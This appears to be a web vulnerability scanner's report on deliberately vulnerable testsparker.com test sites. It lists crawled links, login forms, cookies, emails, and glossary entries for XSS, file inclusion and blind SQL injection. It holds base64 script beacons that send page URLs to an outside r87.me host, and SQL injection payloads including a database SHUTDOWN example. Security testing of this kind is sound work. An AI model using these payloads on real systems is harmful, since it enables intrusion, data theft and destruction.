+GET http://angular.testsparker.com/assets/bootstrap/js/bootstrap.min.js response code: 200
+GET http://angular.testsparker.com/assets/select2/select2.min.js response code: 200
+GET http://angular.testsparker.com/styles.2d4c4e9c161b36377f6f.bundle.css response code: 200
+GET http://angular.testsparker.com/inline.318b50c57b4eba3d437b.bundle.js response code: 200
+GET http://angular.testsparker.com/polyfills.1ab4c7836bc0ed44dbb7.bundle.js response code: 200
+GET http://angular.testsparker.com/main.fbe5fbd112683a8c2d92.bundle.js response code: 200
+GET http://angular.testsparker.com/scripts.44b928e8fa0a1a3dd8c0.bundle.js response code: 200
+GET http://angular.testsparker.com/contact response code: 200
+GET http://angular.testsparker.com/results response code: 200
+GET http://angular.testsparker.com/components response code: 200
+GET http://angular.testsparker.com/docs response code: 200
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419211","1066433","150169","Number of data uri: 3
+Data URI data:;base64,bD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7bC5yZWw9InByZWZldGNoIjtsLmhyZWY9Ii8vNjBldWZ6cHFyZnJlanJsZWh5c2Z1Mm56aDZsb3Ntc2xjcF93OG94ayIrImt4bS5yODcubWUvci8/Iitsb2NhdGlvbi5ocmVmO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobCk= is found on http://aspnet.testsparker.com/GuestbookList.aspx
+Data URI data:;base64,bD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7bC5yZWw9InByZWZldGNoIjtsLmhyZWY9Ii8veHlyN21vZndlMHVjdnpucXBnbzVkMV9pczZmY2JkaHFvemcxbmlueiIrInhxYy5yODcubWUvci8/Iitsb2NhdGlvbi5ocmVmO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobCk= is found on http://aspnet.testsparker.com/GuestbookList.aspx
+Data URI data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAVCAYAAACwnEswAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAEQSURBVGhD7Y8xDgMxDMPu/59u4UEAIci5pF16aQhoMKXF1+FwOBwOh8M3vJA7ui0905G2FZJ6z3asPpi2dClO2jAidZ6t+OTBtKWTT66Y8SK5reHDs4/7lrecSD65gl6d31vDZ5k7fOs3Yafe7xEr20fjj/o9wrd+E3azIalntiA95fcI3/KWE97NRqTO83jSM8l1pC2dvLsuInm/Bb13j6J7ovOJtKVbCRl1zsr2p/FHRunoNvSzcUads7L9WfjEXTpmNoLbFGfUOSvbx5GeS65wz1tOJJ9cQZ9CRt0WpOfo5JMr7tyqL3jLFZ3fivQgXQpJPeOkDSNS59mS0YPsuk2RdpWOtK04aVM5/B/X9QbebcRK60qZaQ...(truncated)
+ is found on http://aspnet.testsparker.com/administrator/?r=/Dashboard/&newAuth=1
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419196","1066426","150087","APIs from: http://aspnet.testsparker.com/WS_search.asmx?WSDL
+GetEmployee
+HelloWorld
+
+APIs from: http://aspnet.testsparker.com/WS_search.asmx?wsdl
+GetEmployee
+HelloWorld
+
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419194","1066424","150176","
+Number of unique JS libraries: 3
+Javascript library : METAGeneratorReports
+Version : Bootply
+Found on the following page(only first page is reported):
+ http://aspnet.testsparker.com/
+
+===============================================================
+
+Javascript library : jQuery
+Version : 2.0.2
+Script uri : http://ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js
+Found on the following page(only first page is reported):
+ http://aspnet.testsparker.com/
+
+===============================================================
+
+Javascript library : jQuery
+Version : 3.2.1
+Script uri : http://angular.testsparker.com/assets/jquery-1.12.1.min.js
+Found on the following page(only first page is reported):
+ http://angular.testsparker.com/
+
+===============================================================
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419206","1027721","150010","Number of links: 36
+https://www.google.com/maps/embed?origin=mfe&pb=!1m2!2m1!1smavituna+security
+https://fonts.googleapis.com/css?family=Roboto%3A300%2C400%2C500%2C700%2C400italic
+https://fonts.googleapis.com/icon?family=Material%2BIcons
+https://blockchain.info/
+http://www.w3.org/TR/REC-xml-names/
+http://www.w3.org/TR/wsdl
+http://www.bitcoin.org/
+http://www.bitcoin.org/favicon.ico
+http://xyr7mofwe0ucvznqpgo5d1_is6fcbdhqozg1ninzxqc.r87.me/r/?http://aspnet.testsparker.com/GuestbookList.aspx
+http://60eufzpqrfohi_nzl3dfpnbhmsrnyy0t1o5a4eanfa0.r87.me/
+http://xyr7mofwe0kqwqaauiwuwt-jg99wmrxsgkdox-iwi30.r87.me/
+http://60eufzpqrffehcg3uudxgwgdxqmuvxmpxnpwq2uiati.r87.me/
+http://maxcdn.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap.min.css
+http://maxcdn.bootstrapcdn.com/bootstrap/3.0.3/js/bootstrap.min.js
+http://xyr7mofwe0frdpkhj9tngkz7fsgyshg8blcoomhtlji.r87.me/
+http://60eufzpqrfjszm-0emzla4xyxvzwx88_b0of5ucgjfi.r87.me/
+http://xyr7mofwe0wg249hj0xyosbkk6l7jfoaijw7mna4zxw.r87.me/
+http://ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js
+http://xyr7mofwe0hmlwpe145ql1ofjxnyizsekq5_s5oqf8y.r87.me/
+http://blockchain.info/
+http://maps.google.com/maps?q=mavituna+security&output=embed
+http://60eufzpqrfgqousnvqqauhaxrmn3haakbfgqjlo5nks.r87.me/
+http://60eufzpqrfrejrlehysfu2nzh6losmslcp_w8oxkkxm.r87.me/r/?http://aspnet.testsparker.com/GuestbookList.aspx
+http://html5shim.googlecode.com/svn/trunk/html5.js
+http://60eufzpqrftzjb78scdgnrihstjjgm9qahnufys8ymc.r87.me/
+http://go.microsoft.com/fwlink/?LinkID=62293&IIS70Error=404,0,0x80070002,9600
+http://go.microsoft.com/fwlink/?LinkID=62293&IIS70Error=404,8,0x00000000,9600
+http://go.microsoft.com/fwlink/?LinkID=66439
+http://xyr7mofwe0drsebfnzktacwtiggktyimtxp98yd1sou.r87.me/
+http://60eufzpqrfgbufjhafj0fqapfysd6bjklw7_8h4ksa8.r87.me/
+http://www.freecsstemplates.org/
+http://microsoft.com/webservices/
+http://facebook.com/testsparker
+http://www.ietf.org/rfc/rfc2396.txt
+http://www.rfc-editor.org/rfc/bcp/bcp47.txt
+http://twitter.com/testsparker
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419210","1027725","150009","Duration of crawl phase (seconds): 407.00
+Number of links: 190
+(This number excludes form requests and links re-requested during authentication.)
+
+http://testsparker.com/
+http://aspnet.testsparker.com/
+http://aspnet.testsparker.com/About.aspx?hello=visitor
+http://aspnet.testsparker.com/Blogs.aspx
+http://aspnet.testsparker.com/Contact.aspx
+http://aspnet.testsparker.com/Converter.aspx
+http://aspnet.testsparker.com/ConverterResponse.aspx
+http://aspnet.testsparker.com/Default.aspx
+http://aspnet.testsparker.com/Generics/FormString.asp
+http://aspnet.testsparker.com/Guestbook.aspx
+http://aspnet.testsparker.com/GuestbookList.aspx
+http://aspnet.testsparker.com/Help.aspx
+http://aspnet.testsparker.com/Help.aspx?item=help-konu1.html
+http://aspnet.testsparker.com/Pricings.aspx
+http://aspnet.testsparker.com/Pricings.aspx?edition=pro
+http://aspnet.testsparker.com/Pricings.aspx?edition=std
+http://aspnet.testsparker.com/Products.aspx?pId=3
+http://aspnet.testsparker.com/Products.aspx?pId=4
+http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F
+http://aspnet.testsparker.com/Shop.aspx
+http://aspnet.testsparker.com/WS_search.asmx
+http://aspnet.testsparker.com/WS_search.asmx?WSDL
+http://aspnet.testsparker.com/WS_search.asmx?disco
+http://aspnet.testsparker.com/WS_search.asmx?op=GetEmployee
+http://aspnet.testsparker.com/WS_search.asmx?op=HelloWorld
+http://aspnet.testsparker.com/administrator/
+http://aspnet.testsparker.com/administrator/?r=%2FDashboard%2F
+http://aspnet.testsparker.com/administrator/?r=/Dashboard/
+http://aspnet.testsparker.com/administrator/?r=/Dashboard/&newAuth=1
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-38/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-43/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-48/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-53/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-58/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-63/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-68/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-73/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-78/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-83/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-88/
+http://aspnet.testsparker.com/blog/how-does-bitcoin-work-93/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-40/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-45/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-50/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-55/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-60/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-65/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-70/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-75/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-80/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-85/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-90/
+http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-95/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-39/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-44/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-49/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-54/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-59/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-64/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-69/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-74/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-79/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-84/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-89/
+http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-94/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-36/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-41/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-46/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-51/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-56/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-61/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-66/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-71/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-76/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-81/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-86/
+http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-91/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-37/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-42/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-47/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-52/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-57/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-62/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-67/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-72/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-77/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-82/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-87/
+http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-92/
+http://aspnet.testsparker.com/favicon.ico
+http://aspnet.testsparker.com/redirect.aspx?site=bitcoin.org
+http://aspnet.testsparker.com/statics/Web.config
+http://aspnet.testsparker.com/statics/btnBuyNowPricing.gif
+http://aspnet.testsparker.com/statics/btnBuyNowPricingBlue.gif
+http://aspnet.testsparker.com/statics/data.mdb
+http://aspnet.testsparker.com/statics/download/
+http://aspnet.testsparker.com/statics/help-konu1.html
+http://aspnet.testsparker.com/statics/help-yes.html
+http://aspnet.testsparker.com/statics/pear.sh
+http://aspnet.testsparker.com/statics/qrcode.png
+http://aspnet.testsparker.com/statics/y.gif
+http://php.testsparker.com/
+http://php.testsparker.com/Generics/style.css
+http://php.testsparker.com/artist.php
+http://php.testsparker.com/artist.php?id=test
+http://php.testsparker.com/auth/
+http://php.testsparker.com/auth/images/2img06.jpeg
+http://php.testsparker.com/auth/images/arrow-01.gif
+http://php.testsparker.com/auth/images/detail-btn-h.gif
+http://php.testsparker.com/auth/images/detail-btn.gif
+http://php.testsparker.com/auth/images/dot-01.gif
+http://php.testsparker.com/auth/images/dot-02.gif
+http://php.testsparker.com/auth/images/footer-bg.gif
+http://php.testsparker.com/auth/images/generic-mini.png
+http://php.testsparker.com/auth/images/green-bullet.gif
+http://php.testsparker.com/auth/images/img01.gif
+http://php.testsparker.com/auth/images/img02.gif
+http://php.testsparker.com/auth/images/img03.gif
+http://php.testsparker.com/auth/images/img04.gif
+http://php.testsparker.com/auth/images/img05.gif
+http://php.testsparker.com/auth/images/img06.jpeg
+http://php.testsparker.com/auth/images/img07.gif
+http://php.testsparker.com/auth/images/img08.gif
+http://php.testsparker.com/auth/images/main-slideshow-no-flash.jpg
+http://php.testsparker.com/auth/images/more-btn-h.gif
+http://php.testsparker.com/auth/images/more-btn.gif
+http://php.testsparker.com/auth/images/pro-pic-01.gif
+http://php.testsparker.com/auth/images/pro-pic-02.gif
+http://php.testsparker.com/auth/images/pro-pic-03.gif
+http://php.testsparker.com/auth/images/product-green-bg.gif
+http://php.testsparker.com/auth/images/right-pic-01.gif
+http://php.testsparker.com/auth/images/right-pic-02.gif
+http://php.testsparker.com/auth/images/right-pic-03.gif
+http://php.testsparker.com/auth/images/shell-mini.gif
+http://php.testsparker.com/auth/images/spacer.gif
+http://php.testsparker.com/auth/images/sql-injection-boolean-mini.png
+http://php.testsparker.com/auth/images/sql-injection-mini.png
+http://php.testsparker.com/auth/images/welcome-txt.gif
+http://php.testsparker.com/auth/login.php
+http://php.testsparker.com/favicon.ico
+http://php.testsparker.com/function.mysql-connect
+http://php.testsparker.com/hello.php?name=Visitor
+http://php.testsparker.com/images/footer-bg.gif
+http://php.testsparker.com/images/img01.gif
+http://php.testsparker.com/images/img02.gif
+http://php.testsparker.com/images/img03.gif
+http://php.testsparker.com/images/main-slideshow-no-flash.jpg
+http://php.testsparker.com/nslookup.php
+http://php.testsparker.com/process.php?file=Generics/about.nsp
+http://php.testsparker.com/process.php?file=Generics/contact.nsp
+http://php.testsparker.com/process.php?file=Generics/index.nsp
+http://php.testsparker.com/products.php?pro=url
+http://php.testsparker.com/url
+http://angular.testsparker.com/
+http://angular.testsparker.com/activity
+http://angular.testsparker.com/api/animations/style
+http://angular.testsparker.com/api/checkToken.php?value=b4c2de273842f4a94d3cc666976ba8e6
+http://angular.testsparker.com/api/common/http
+http://angular.testsparker.com/api/getActivities.php
+http://angular.testsparker.com/api/getAvatar.php?file=ava.png
+http://angular.testsparker.com/api/getAvatar.php?file=charlotte.png
+http://angular.testsparker.com/api/getAvatar.php?file=emma.png
+http://angular.testsparker.com/api/getAvatar.php?file=mia.png
+http://angular.testsparker.com/api/getAvatar.php?file=olivia.png
+http://angular.testsparker.com/api/getLanguages.php
+http://angular.testsparker.com/api/getUser.php?username=ava
+http://angular.testsparker.com/api/getUser.php?username=charlotte
+http://angular.testsparker.com/api/getUser.php?username=emma
+http://angular.testsparker.com/api/getUser.php?username=mia
+http://angular.testsparker.com/api/getUser.php?username=olivia
+http://angular.testsparker.com/api/router/RouterLinkWithHref
+http://angular.testsparker.com/cli
+http://angular.testsparker.com/components
+http://angular.testsparker.com/contact
+http://angular.testsparker.com/docs
+http://angular.testsparker.com/extras
+http://angular.testsparker.com/favicon.ico
+http://angular.testsparker.com/guide/glossary
+http://angular.testsparker.com/guide/security
+http://angular.testsparker.com/guide/styleguide
+http://angular.testsparker.com/home
+http://angular.testsparker.com/languages
+http://angular.testsparker.com/results
+http://angular.testsparker.com/user/ava
+http://angular.testsparker.com/user/charlotte
+http://angular.testsparker.com/user/emma
+http://angular.testsparker.com/user/mia
+http://angular.testsparker.com/user/olivia
+http://angular.testsparker.com:8000/favicon.ico
+http://angular.testsparker.com:8000/setToken.php
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419193","1066423","150115","Authentication form found at: http://angular.testsparker.com/results
+ Action uri: http://angular.testsparker.com/
+ Fields: username, password, 
+Authentication form found at: http://aspnet.testsparker.com/administrator/?r=/Dashboard/
+ Action uri: http://aspnet.testsparker.com/Dashboard/
+ Fields: ctl00%24contentCenterMenu%24login_C_S_R_F_inLoginDetected%24Email, ctl00%24contentCenterMenu%24login_C_S_R_F_inLoginDetected%24Button1, ctl00%24contentCenterMenu%24login_C_S_R_F_inLoginDetected%24Password
+Authentication form found at: http://php.testsparker.com/auth/login.php
+ Action uri: http://php.testsparker.com/auth/control.php
+ Fields: username, password, 
+Authentication form found at: http://aspnet.testsparker.com/administrator/?r=/Dashboard/&newAuth=1
+ Action uri: http://aspnet.testsparker.com/Dashboard/
+ Fields: ctl00%24contentCenterMenu%24login_C_S_R_F_inLoginDetected%24Email, ctl00%24contentCenterMenu%24login_C_S_R_F_inLoginDetected%24Password, ctl00%24contentCenterMenu%24login_C_S_R_F_inLoginDetected%24Button1, ctl00%24contentCenterMenu%24login_C_S_R_F_inLoginDetected%24Captcha
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419197","1027719","6","#table
+IP_address Host_name
+
+54.204.37.212 ec2-54-204-37-212.compute-1.amazonaws.com
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419209","1066432","150104","http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F
+http://aspnet.testsparker.com/Contact.aspx
+http://angular.testsparker.com/contact
+http://aspnet.testsparker.com/administrator/?r=/Dashboard/
+http://aspnet.testsparker.com/administrator/?r=/Dashboard/&newAuth=1
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419204","1066430","150099","Total cookies: 2
+ASP.NET_SessionId=havj4q23ybonxjxbm5fecqt3; HttpOnly; path=/ First set at URL: http://aspnet.testsparker.com/
+TestCookie=Hello; path=/ First set at URL: http://aspnet.testsparker.com/
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419203","1066429","150066","__VIEWSTATE statistics:
+Fields analyzed: 87
+Average size (bytes): 174.30
+Median size  (bytes): 68.04
+Maximum size (bytes): 8044.00
+Approximate percentage of bytes used by __VIEWSTATE values within all pages inspected by the crawler: 0.78 (15164.00 out of 1945812.00)
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419215","1066434","150205","
+X-Xss-Protection: Header misconfigured
+Expected value: one of the following
+ 1; mode=block
+ 1; mode=block; report=<reporting-uri>
+NOTE: On https page the reporting-uri (if specified) should be https.
+Misconfigured response header:
+X-Xss-Protection:0 on the link: GET http://aspnet.testsparker.com/Generics/FormString.asp response code: 404
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419200","1066427","150126","44.000000 bytes/sec http://angular.testsparker.com:8000/setToken.php
+49.800000 bytes/sec http://aspnet.testsparker.com/ConverterResponse.aspx
+65.000000 bytes/sec http://angular.testsparker.com/api/checkToken.php?value=b4c2de273842f4a94d3cc666976ba8e6
+176.000000 bytes/sec http://aspnet.testsparker.com/statics/data.mdb
+384.000000 bytes/sec http://aspnet.testsparker.com/statics/y.gif
+387.000000 bytes/sec http://php.testsparker.com/images/img02.gif
+649.000000 bytes/sec http://aspnet.testsparker.com/statics/pear.sh
+812.000000 bytes/sec http://aspnet.testsparker.com/statics/qrcode.png
+3087.000000 bytes/sec http://php.testsparker.com/images/img01.gif
+3718.000000 bytes/sec http://php.testsparker.com/auth/images/shell-mini.gif
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419212","1027726","150142","Virtual host discovered:
+
+Detected based on: HTTP Response code
+Virtual Host: www.testsparker.com
+URI: http://testsparker.com/
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419195","1066425","150054","Number of emails: 4
+alan@turing.com first seen at http://aspnet.testsparker.com/administrator/?r=/Dashboard/
+mail@testsparker.com first seen at http://aspnet.testsparker.com/Contact.aspx
+sales@testsparker.com first seen at http://aspnet.testsparker.com/Contact.aspx
+test@testsparker.com first seen at http://php.testsparker.com/process.php?file=Generics/contact.nsp
+","24 Apr 2019 01:41AM GMT"
+"GLOSSARY"
+"QID","Id","Title","Category","Severity Level","Groups","OWASP","WASC","CWE","CVSS Base","CVSS Temporal","Description","Impact","Solution"
+"QID","6","DNS Host Name","Information Gathered","1","","","","",,,"The fully qualified domain name of this host, if it was obtained from a DNS server, is displayed in the RESULT section.","N/A","N/A"
+"QID","45017","Operating System Detected","Information Gathered","2","","","","",,,"Several different techniques can be used to identify the operating system (OS) running on a host. A short description of these techniques is provided below. The specific technique used to identify the OS on this host is included in the RESULTS section of your report.
+<P>
+1) <B>TCP/IP Fingerprint</B>: The operating system of a host can be identified from a remote system using TCP/IP fingerprinting. All underlying operating system TCP/IP stacks have subtle differences that can be seen in their responses to specially-crafted TCP packets. According to the results of this ""fingerprinting"" technique, the OS version is among those listed below. 
+<P>
+Note that if one or more of these subtle differences are modified by a firewall or a packet filtering device between the scanner and the host, the fingerprinting technique may fail. Consequently, the version of the OS may not be detected correctly. If the host is behind a proxy-type firewall, the version of the operating system detected may be that of the firewall instead of the host being scanned.
+<P>
+2) <B>NetBIOS</B>: Short for Network Basic Input Output System, an application programming interface (API) that augments the DOS BIOS by adding special functions for local-area networks (LANs). Almost all LANs for PCs are based on the NetBIOS. Some LAN manufacturers have even extended it, adding additional network capabilities. NetBIOS relies on a message format called Server Message Block (SMB). 
+<P>
+3) <B>PHP Info</B>: PHP is a hypertext pre-processor, an open-source, server-side, HTML-embedded scripting language used to create dynamic Web pages. Under some configurations it is possible to call PHP functions like phpinfo() and obtain operating system information.
+<P>
+4) <B>SNMP</B>: The Simple Network Monitoring Protocol is used to monitor hosts, routers, and the networks to which they attach. The SNMP service maintains Management Information Base (MIB), a set of variables (database) that can be fetched by Managers. These include ""MIB_II.system.sysDescr"" for the operating system.
+","Not  applicable.","Not  applicable."
+"QID","45038","Host Scan Time","Information Gathered","1","","","","",,,"The Host Scan Time is the period of time it takes the scanning engine to perform the vulnerability assessment of a single target host. The Host Scan Time for this host is reported in the Result section below. 
+<P>
+The Host Scan Time does not have a direct correlation to the Duration time as displayed in the Report Summary section of a scan results report. The Duration is the period of time it takes the service to perform a scan task. The Duration includes the time it takes the service to scan all hosts, which may involve parallel scanning. It also includes the time it takes for a scanner appliance to pick up the scan task and transfer the results back to the service's Secure Operating Center. Further, when a scan task is distributed across multiple scanners, the Duration includes the time it takes to perform parallel host scanning on all scanners.
+<P>
+For host running the Qualys Windows agent this QID reports the time taken by the agent to collect the host metadata used for the most recent assessment scan.","N/A","N/A"
+"QID","150001","Reflected Cross-Site Scripting (XSS) Vulnerabilities","Confirmed Vulnerability","5","XSS","A7","WASC-8","CWE-79","4.3","3.9","XSS vulnerabilities occur when the Web application echoes user-supplied data in an HTML response sent to the Web browser. For example, a Web application might include the user's name as part of a welcome message or display a home address when confirming a shipping destination. If the user-supplied data contain characters that are interpreted as part of an HTML element instead of literal text, then an attacker can modify the HTML that is received by the victim's Web browser.
+<P>
+The XSS payload is echoed in HTML document returned by the request. An XSS payload may consist of HTML, JavaScript or other content that will be rendered by the browser. In order to exploit this vulnerability, a malicious user would need to trick a victim into visiting the URL with the XSS payload.","XSS exploits pose a significant threat to a Web application, its users and user data. XSS exploits target the users of a Web application rather than the Web application itself. An exploit can lead to theft of the user's credentials and personal or financial information. Complex exploits and attack scenarios are possible via XSS because it enables an attacker to execute dynamic code. Consequently, any capability or feature available to the Web browser (for example HTML, JavaScript, Flash and Java applets) can be used to as a part of a compromise.","Filter all data collected from the client including user-supplied content and browser content such as Referrer and User-Agent headers.
+<P>
+Any data collected from the client and displayed in a Web page should be HTML-encoded to ensure the content is rendered as text instead of an HTML element or JavaScript."
+"QID","150004","Path-Based Vulnerability","Confirmed Vulnerability","2","PATH","A5","WASC-16,WASC-17,WASC-15","CWE-22","2.1","1.9","A potentially sensitive file, directory, or directory listing was discovered on the Web server.","The contents of this file or directory may disclose sensitive information.","Verify that access to this file or directory is permitted. If necessary, remove it or apply access controls to it."
+"QID","150009","Links Crawled","Information Gathered","1","","","","",,,"The list of unique links crawled and HTML forms submitted by the Web application scanner appear in the Results section. This list may contain fewer links than the maximum threshold defined at scan launch. 
+<P>NOTE: This list also includes 
+- All the unique links that are reported in QID 150140 (Redundant links/URL paths crawled and not crawled)
+- All the forms reported in QID 150152 (Forms Crawled), 
+- All the forms in QID 150115 (Authentication Form Found) and 
+- Certain requests from QID 150172 (Requests Crawled)","N/A","N/A"
+"QID","150010","External Links Discovered","Information Gathered","1","","","","",,,"The external links discovered by the Web application scanning engine are provided in the Results section. These links were present on the target Web application, but were not crawled.","N/A","N/A"
+"QID","150011","Local File Inclusion","Confirmed Vulnerability","3","PATH","A5","WASC-13,WASC-2","CWE-22","5.0","4.5","A parameter within the Web application could be modified to point to a local file on the Web server. The content of this file was displayed in the HTML response from the application.","Local file inclusion can expose sensitive files through the Web application. Typically, any file that is readable by the user privileges associated with the Web service can be exposed. This can divulge source code, database configurations, and other sensitive information inside or outside the Web document root.","Apply strict input validation against the parameter's value. At the very least, directory traversal characters (../ or ..\) should be disallowed."
+"QID","150012","Blind SQL Injection","Confirmed Vulnerability","5","SQL","A1","WASC-19","CWE-89","9.3","6.8","<P>Blind SQL injection is a specialized type of SQL injection that enables an attacker to modify the syntax of a SQL query in order to retrieve, corrupt or delete data. A successful exploit manipulates query criteria in a manner that affects the query's logic. The typical causes of this vulnerability are lack of input validation and insecure construction of the SQL query.
+</P>
+<P>Queries created by concatenating strings with SQL syntax and user-supplied data are prone to this vulnerability. When any part of the string concatenation can be modified, an attacker has the ability to change the meaning of the query.
+</P>
+<P>Typical detection techniques for SQL injection vulnerabilities use a payload that attempts to produce an error response from the web application. Detection based on blind SQL injection uses inference based on the differences among the application's responses to various payloads. Blind SQL does not rely on error messages, which is beneficial when testing web applications that trap errors.
+</P>
+<P><B>How It Works:</B><BR>
+The WAS scanning engine uses a well known methodology called <I>""True and False""</I> inference to determine if there is a blind SQL injection vulnerability. Basically, it uses two payloads: one with a 
+<I>""True condition""</I> and another with a <I>""False condition""</I>. If there is a blind SQL injection vulnerability, the query with the 
+""True condition"" payload will cause the web application to return a different response than the 
+""False condition"". 
+</P>
+A good example of a ""True condition"" payload would be <B>' AND 1=1</B>. Since 1 always equals 1, the condition is true. An example of a ""False condition"" payload would be <B>' AND 1=2</B>. Since 1 does not equal 2, the condition is false.
+<P>
+For example, let's say there is a web application with a textbox that searches for customer names and displays the results inside a table. And let's assume that if someone searches for John there is one result only. When scanning for the blind SQL injection vulnerability, the WAS scanning engine uses two payloads:</P>
+- <U>True condition payload</U>: This injects the string <B>John' AND 1=1</B> to issue the query
+	<I>""return John only if 1=1""</I>. Since 1 always equals 1 the condition is true. The result is John, which is the same result as using the string John.
+<P>
+- <U>False condition payload</U>: This injects the string <B>John' AND 1=2</B> to issue the query
+	<I>""return John only if 1=2""</I>. Since 1 is never equal to 2, the condition is false. The result is nothing or ""No results found"".
+<P>
+With the results from the two payloads, the WAS scanning engine draws the conclusion that there is a blind SQL injection vulnerability. Even though there is no one called 
+<I>""John' AND 1=1""</I> in the database, web application displays information for ""John"" if a search is done with that query string.</P>
+<P>
+<B>Example:</B><BR>
+These few lines demonstrate an insecure query that is created by appending user-supplied data (<B>name</B>):
+</P>
+<CODE>
+On Error Resume Next ' Page traps error and do not display it<BR>
+Set oRSu = oCONv.Execute(""SELECT fname, name FROM customers WHERE name = '"" &amp; Request(""txtSearch"") &amp; ""'"")<BR>
+If oRSu.BOF Or Err.Number <> 0 Then<BR>
+&nbsp;&nbsp;&nbsp; Response.Write ""No results found!""<BR>
+End If
+</CODE>
+<P>
+If no checks are performed against the name parameter, then the query may be arbitrarily modified and sent to database as shown in these two examples of a completed query:
+</P>
+<CODE>
+SELECT fname, name FROM customers WHERE name='<B>John' AND 1=1</B> <BR>
+SELECT fname, name FROM customers WHERE name= 'John'; SHUTDOWN WITH NOWAIT
+</CODE>
